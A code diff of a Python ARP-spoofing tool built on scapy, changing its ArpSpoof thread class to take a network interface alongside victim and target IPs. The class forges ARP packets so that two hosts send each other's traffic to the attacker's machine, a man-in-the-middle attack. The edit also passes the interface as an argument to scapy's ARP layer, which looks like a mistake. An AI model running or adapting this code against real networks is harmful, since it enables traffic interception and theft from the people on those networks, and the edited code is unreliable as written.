@@ -11,17 +11,18 @@ from scapy.layers.l2 import ARP, Ether
 
 class ArpSpoof(threading.Thread):
 
-    def __init__(self, vIP=None, tIP=None):
+    def __init__(self, iface, vIP, tIP):
+        self.iface = iface
         self.vIP = vIP
         self.tIP = tIP
-        self.own_mac_address = NetworkDiscoverer().get_own_mac_address()
+        self.own_mac_address = NetworkDiscoverer().get_own_mac_address(iface)
         threading.Thread.__init__(self)
 
     def spoof_arp(self):
         print("Spoofing %s and %s with %s" % (self.tIP, self.vIP, self.own_mac_address))
         sendp([
-            Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.tIP, pdst=self.vIP),
-            Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.vIP, pdst=self.tIP)
+            Ether() / ARP(iface=self.iface, op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.tIP, pdst=self.vIP),
+            Ether() / ARP(iface=self.iface, op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.vIP, pdst=self.tIP)
         ])
 
     def run(self):
